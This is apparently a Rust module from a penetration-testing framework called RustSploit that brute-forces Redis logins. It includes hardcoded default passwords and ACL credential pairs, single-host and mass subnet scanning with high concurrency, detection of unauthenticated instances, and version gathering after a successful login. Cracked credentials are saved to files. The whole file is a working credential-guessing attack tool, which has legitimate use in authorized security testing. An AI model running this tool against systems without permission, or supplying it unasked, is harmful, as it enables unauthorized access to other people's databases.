use anyhow::{ anyhow, Context, Result };
use colored::*;
use std::io::{ Read, Write };
use std::net::IpAddr;
use std::time::Duration;

use crate::module::{ ModuleCtx, ModuleOutcome };
use crate::utils::{
    load_lines,
    get_filename_in_current_dir,
    cfg_prompt_default,
    cfg_prompt_yes_no,
    cfg_prompt_existing_file,
    cfg_prompt_int_range,
    cfg_prompt_output_file,
};
use crate::utils::{
    BruteforceConfig,
    LoginResult,
    SubnetScanConfig,
    generate_combos_mode,
    parse_combo_mode,
    load_credential_file,
    run_bruteforce,
    run_subnet_bruteforce,
    is_subnet_target,
};

// ============================================================================
// Constants
// ============================================================================

const DEFAULT_REDIS_PORT: u16 = 6379;

/// Default passwords for Redis (password-only mode).
/// Redis commonly runs with no auth, "redis", "foobared", etc.
const DEFAULT_PASSWORDS: &[&str] = &[
    "",          // no auth
    "redis",
    "password",
    "foobared",
    "admin",
    "123456",
    "root",
    "default",
    "letmein",
    "changeme",
];

/// Default ACL credentials for Redis 6+ (username:password).
const DEFAULT_ACL_CREDENTIALS: &[(&str, &str)] = &[
    ("default", ""),
    ("default", "redis"),
    ("default", "password"),
    ("default", "foobared"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "redis"),
    ("root", "root"),
];

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "Redis Brute Force".to_string(),
        description: "Brute-force Redis authentication using raw TCP protocol. Supports both \
            legacy password-only AUTH and Redis 6+ ACL mode (AUTH username password). \
            Tests default credentials, gathers server info on success, and supports \
            subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://redis.io/docs/management/security/".to_string(),
            "https://redis.io/docs/management/security/acl/".to_string(),
        ],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

// ============================================================================
// Error Classification
// ============================================================================

#[derive(Debug, Clone, PartialEq)]
enum RedisErrorType {
    AuthenticationFailed,
    NoAuthRequired,
    ConnectionRefused,
    ConnectionTimeout,
    ProtocolError,
    Unknown,
}

impl RedisErrorType {
    fn classify_error(msg: &str) -> Self {
        let lower = msg.to_lowercase();
        if lower.contains("noauth") || lower.contains("no auth") {
            Self::NoAuthRequired
        } else if lower.contains("-err")
            || lower.contains("wrongpass")
            || lower.contains("invalid password")
            || lower.contains("authentication")
        {
            Self::AuthenticationFailed
        } else if lower.contains("refused")
            || lower.contains("reset")
            || lower.contains("broken pipe")
        {
            Self::ConnectionRefused
        } else if lower.contains("timeout")
            || lower.contains("timed out")
            || lower.contains("deadline")
        {
            Self::ConnectionTimeout
        } else if lower.contains("protocol") || lower.contains("unexpected") {
            Self::ProtocolError
        } else {
            Self::Unknown
        }
    }

    fn is_retryable(&self) -> bool {
        matches!(self, Self::ConnectionRefused | Self::ConnectionTimeout | Self::Unknown)
    }

    fn description(&self) -> &'static str {
        match self {
            Self::AuthenticationFailed => "Authentication failed",
            Self::NoAuthRequired => "No authentication required",
            Self::ConnectionRefused => "Connection refused/reset",
            Self::ConnectionTimeout => "Connection timed out",
            Self::ProtocolError => "Protocol error",
            Self::Unknown => "Unknown error",
        }
    }
}

#[derive(Debug)]
struct RedisError {
    error_type: RedisErrorType,
    message: String,
}

impl std::fmt::Display for RedisError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "[{}] {}", self.error_type.description(), self.message)
    }
}

impl std::error::Error for RedisError {}

impl RedisError {
    fn from_anyhow(err: anyhow::Error) -> Self {
        let msg = err.to_string();
        let error_type = RedisErrorType::classify_error(&msg);
        Self { error_type, message: msg }
    }
}

// ============================================================================
// Module Entry Point
// ============================================================================

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("redis_bruteforce requires a single-host target")?;
    crate::mprintln!("\n{}", "=== Redis Bruteforce Module (RustSploit) ===".bold().cyan());
    crate::mprintln!();

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());

        let use_acl = cfg_prompt_yes_no("use_acl", "Use ACL mode? (Redis 6+ username+password)", false).await?;
        let port = cfg_prompt_int_range("port", "Port", DEFAULT_REDIS_PORT as i64, 1, 65535).await? as u16;

        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let passes = load_lines(&passwords_file)?;
        if passes.is_empty() { return Err(anyhow!("Password list empty")); }

        let users = if use_acl {
            let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
            let u = load_lines(&usernames_file)?;
            if u.is_empty() { return Err(anyhow!("User list empty")); }
            u
        } else {
            // In password-only mode, use a single empty username
            vec![String::new()]
        };

        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file("output_file", "Output result file", "redis_subnet_results.txt").await?;

        let connection_timeout: u64 = 5;

        let limiter = ctx.limiter.clone();
        let module_path = ctx.module_path.clone();
        run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "redis",
            jitter_ms: 50,
            source_module: "creds/generic/redis_credcheck",
            skip_tcp_check: false,
            state_file: None,
        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
            let limiter = limiter.clone();
            let module_path = module_path.clone();
            async move {
                let target_str = ip.to_string();
                limiter.acquire(&module_path, &target_str).await;
                let res = tokio::task::spawn_blocking(move || {
                    attempt_redis_login(&target_str, port, &user, &pass, use_acl, connection_timeout)
                }).await;
                match res {
                    Ok(Ok(true)) => LoginResult::Success,
                    Ok(Ok(false)) => LoginResult::AuthFailed,
                    Ok(Err(e)) => LoginResult::Error {
                        message: e.message,
                        retryable: e.error_type.is_retryable(),
                    },
                    Err(e) => LoginResult::Error {
                        message: format!("Task panic: {}", e),
                        retryable: false,
                    },
                }
            }
        }).await?;
        return Ok(ModuleOutcome::ok());
    }

    // --- Single Target Mode ---
    let use_acl = cfg_prompt_yes_no("use_acl", "Use ACL mode? (Redis 6+ username+password)", false).await?;
    let port = cfg_prompt_int_range("port", "Port", DEFAULT_REDIS_PORT as i64, 1, 65535).await? as u16;

    let use_defaults = cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let passwords_file = if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
        Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
    } else {
        None
    };

    let usernames_file = if use_acl {
        if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
            Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
        } else {
            None
        }
    } else {
        None
    };

    if !use_defaults && passwords_file.is_none() {
        return Err(anyhow!("At least a password wordlist or default credentials must be enabled"));
    }

    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent tasks", 10, 1, 256).await? as usize;
    let connection_timeout = cfg_prompt_int_range("timeout", "Connection timeout (seconds)", 5, 1, 60).await? as u64;
    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries = if retry_on_error {
        cfg_prompt_int_range("max_retries", "Max retries per attempt", 2, 1, 10).await? as usize
    } else {
        0
    };
    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file", "redis_brute_results.txt").await?)
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    crate::mprintln!("\n{}", format!("[*] Starting brute-force on {}:{}", target, port).cyan());

    // Pre-flight: PING the target. If Redis returns +PONG without authentication
    // we can skip the brute force entirely — the instance is already wide open.
    let mut outcome = ModuleOutcome::ok();
    {
        let target_owned = target.to_string();
        let pre_timeout = connection_timeout;
        ctx.rate_limit(target).await;
        let ping_result = tokio::task::spawn_blocking(move || {
            redis_ping(&target_owned, port, pre_timeout)
        })
        .await;
        match ping_result {
            Ok(Ok(true)) => {
                crate::mprintln!(
                    "{}",
                    format!("[+] {}:{} responded +PONG without auth — no credentials required.",
                        target, port).green().bold()
                );
                crate::workspace::add_note(
                    target,
                    "[redis_bruteforce] unauthenticated +PONG received; skipping brute force",
                ).await;
                outcome.findings.push(crate::module::Finding {
                    target: target.to_string(),
                    kind: crate::module::FindingKind::Vulnerable,
                    message: format!("Redis {}:{} unauthenticated — no credentials required", target, port),
                    data: Some(serde_json::json!({"service": "redis", "port": port})),
                });
                return Ok(outcome);
            }
            Ok(Ok(false)) => {
                crate::mprintln!("{}", "[*] Redis returned -NOAUTH; authentication required.".dimmed());
            }
            Ok(Err(e)) => {
                tracing::debug!(host = %target, "redis ping failed: {}", e.message);
            }
            Err(e) => {
                tracing::debug!(host = %target, "redis ping task panic: {}", e);
            }
        }
    }

    // Load wordlists
    let mut usernames = Vec::new();
    let mut passwords = Vec::new();

    if use_acl
        && let Some(ref file) = usernames_file {
            usernames = load_lines(file)?;
            if usernames.is_empty() {
                crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
            } else {
                crate::mprintln!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
            }
        }

    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!("{}", format!("[*] Loaded {} passwords", passwords.len()).green());
        }
    }

    // Add default credentials
    if use_defaults {
        if use_acl {
            for (user, pass) in DEFAULT_ACL_CREDENTIALS {
                if !usernames.contains(&user.to_string()) {
                    usernames.push(user.to_string());
                }
                if !passwords.contains(&pass.to_string()) {
                    passwords.push(pass.to_string());
                }
            }
            crate::mprintln!("{}", format!("[*] Added {} default ACL credentials", DEFAULT_ACL_CREDENTIALS.len()).green());
        } else {
            // Password-only mode: single empty username
            if usernames.is_empty() {
                usernames.push(String::new());
            }
            for pass in DEFAULT_PASSWORDS {
                if !passwords.contains(&pass.to_string()) {
                    passwords.push(pass.to_string());
                }
            }
            crate::mprintln!("{}", format!("[*] Added {} default passwords", DEFAULT_PASSWORDS.len()).green());
        }
    }

    if !use_acl && usernames.is_empty() {
        usernames.push(String::new());
    }
    if usernames.is_empty() {
        return Err(anyhow!("No usernames available (ACL mode requires usernames)"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }

    let limiter = ctx.limiter.clone();
    let module_path = ctx.module_path.clone();
    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let limiter = limiter.clone();
        let module_path = module_path.clone();
        async move {
            limiter.acquire(&module_path, &t).await;
            let res = tokio::task::spawn_blocking(move || {
                attempt_redis_login(&t, p, &user, &pass, use_acl, connection_timeout)
            }).await;
            match res {
                Ok(Ok(true)) => LoginResult::Success,
                Ok(Ok(false)) => LoginResult::AuthFailed,
                Ok(Err(e)) => LoginResult::Error {
                    message: e.message,
                    retryable: e.error_type.is_retryable(),
                },
                Err(e) => LoginResult::Error {
                    message: format!("Task panic: {}", e),
                    retryable: false,
                },
            }
        }
    };

    let result = run_bruteforce(&BruteforceConfig {
        target: target.to_string(),
        port,
        concurrency,
        stop_on_success,
        verbose,
        delay_ms: 0,
        max_retries,
        service_name: "redis",
        jitter_ms: 50,
        source_module: "creds/generic/redis_credcheck",
    }, combos, try_login).await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored Redis responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no("save_unknown_responses", "Save unknown responses to file?", true).await? {
            let default_name = "redis_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            ).await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# Redis Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(outcome)
}

// ============================================================================
// Redis Protocol Functions
// ============================================================================

/// Send a PING to Redis. Returns Ok(true) if we get +PONG without auth,
/// Ok(false) if auth is required (-NOAUTH), Err on connection failure.
fn redis_ping(target: &str, port: u16, timeout_secs: u64) -> std::result::Result<bool, RedisError> {
    let addr = format!("{}:{}", target, port);
    let timeout = Duration::from_secs(timeout_secs);

    let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)
        .map_err(|e| RedisError::from_anyhow(e.into()))?
        .next()
        .ok_or_else(|| RedisError {
            error_type: RedisErrorType::ConnectionRefused,
            message: "Resolution failed".to_string(),
        })?;

    let mut stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)
        .map_err(|e| RedisError::from_anyhow(e.into()))?;
    if let Err(e) = stream.set_nodelay(true) { crate::meprintln!("[!] Socket option error: {}", e); }
    stream.set_read_timeout(Some(timeout)).map_err(|e| RedisError::from_anyhow(e.into()))?;
    stream.set_write_timeout(Some(timeout)).map_err(|e| RedisError::from_anyhow(e.into()))?;

    stream.write_all(&resp_cmd(&[b"PING"]))
        .map_err(|e| RedisError::from_anyhow(e.into()))?;

    let mut buffer = [0u8; 1024];
    let n = stream.read(&mut buffer)
        .map_err(|e| RedisError::from_anyhow(e.into()))?;
    let response = String::from_utf8_lossy(&buffer[..n]);

    if response.contains("+PONG") {
        Ok(true)
    } else if response.contains("-NOAUTH") {
        Ok(false)
    } else {
        Err(RedisError {
            error_type: RedisErrorType::ProtocolError,
            message: format!("Unexpected PING response: {}", response.trim()),
        })
    }
}

/// Build a RESP (REdis Serialization Protocol) array command.
/// Length-prefixed format prevents injection even if args contain \r\n.
fn resp_cmd(args: &[&[u8]]) -> Vec<u8> {
    let mut cmd = format!("*{}\r\n", args.len()).into_bytes();
    for arg in args {
        cmd.extend_from_slice(format!("${}\r\n", arg.len()).as_bytes());
        cmd.extend_from_slice(arg);
        cmd.extend_from_slice(b"\r\n");
    }
    cmd
}

/// Attempt Redis AUTH login using safe RESP protocol framing.
/// Returns Ok(true) on +OK, Ok(false) on -ERR, Err on connection issues.
/// On success, also sends INFO server to gather version info.
fn attempt_redis_login(
    target: &str,
    port: u16,
    user: &str,
    pass: &str,
    acl_mode: bool,
    timeout_secs: u64,
) -> std::result::Result<bool, RedisError> {
    let addr = format!("{}:{}", target, port);
    let timeout = Duration::from_secs(timeout_secs);

    let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)
        .map_err(|e| RedisError::from_anyhow(e.into()))?
        .next()
        .ok_or_else(|| RedisError {
            error_type: RedisErrorType::ConnectionRefused,
            message: "Resolution failed".to_string(),
        })?;

    let mut stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)
        .map_err(|e| RedisError::from_anyhow(e.into()))?;
    if let Err(e) = stream.set_nodelay(true) { crate::meprintln!("[!] Socket option error: {}", e); }
    stream.set_read_timeout(Some(timeout)).map_err(|e| RedisError::from_anyhow(e.into()))?;
    stream.set_write_timeout(Some(timeout)).map_err(|e| RedisError::from_anyhow(e.into()))?;

    // Build AUTH command using RESP array format (injection-safe)
    let auth_cmd = if acl_mode {
        resp_cmd(&[b"AUTH", user.as_bytes(), pass.as_bytes()])
    } else {
        resp_cmd(&[b"AUTH", pass.as_bytes()])
    };

    stream.write_all(&auth_cmd)
        .map_err(|e| RedisError::from_anyhow(e.into()))?;

    let mut buffer = [0u8; 2048];
    let n = stream.read(&mut buffer)
        .map_err(|e| RedisError::from_anyhow(e.into()))?;
    let response = String::from_utf8_lossy(&buffer[..n]);

    if response.contains("+OK") {
        // Auth succeeded — gather server info
        if stream.write_all(&resp_cmd(&[b"INFO", b"server"])).is_ok() {
            let mut info_buf = [0u8; 4096];
            if let Ok(info_n) = stream.read(&mut info_buf) {
                let info_response = String::from_utf8_lossy(&info_buf[..info_n]);
                // Extract version if available
                for line in info_response.lines() {
                    if line.starts_with("redis_version:") {
                        crate::mprintln!(
                            "{}",
                            format!("  [i] Redis version on {}:{} -> {}", target, port, line.trim()).cyan()
                        );
                        break;
                    }
                }
            }
        }
        // Clean disconnect
        if let Err(e) = stream.write_all(&resp_cmd(&[b"QUIT"])) { crate::meprintln!("[!] Redis QUIT write error: {}", e); }
        return Ok(true);
    }

    if response.contains("-ERR") || response.contains("-WRONGPASS") {
        return Ok(false);
    }

    // Server requires no password — treat empty-password probe as success
    if response.contains("-NOAUTH") && pass.is_empty() {
        return Ok(true);
    }

    Err(RedisError {
        error_type: RedisErrorType::ProtocolError,
        message: format!("Unexpected AUTH response: {}", response.trim()),
    })
}

crate::register_native_module!(crate::module::Category::Creds, "generic/redis_bruteforce", native);
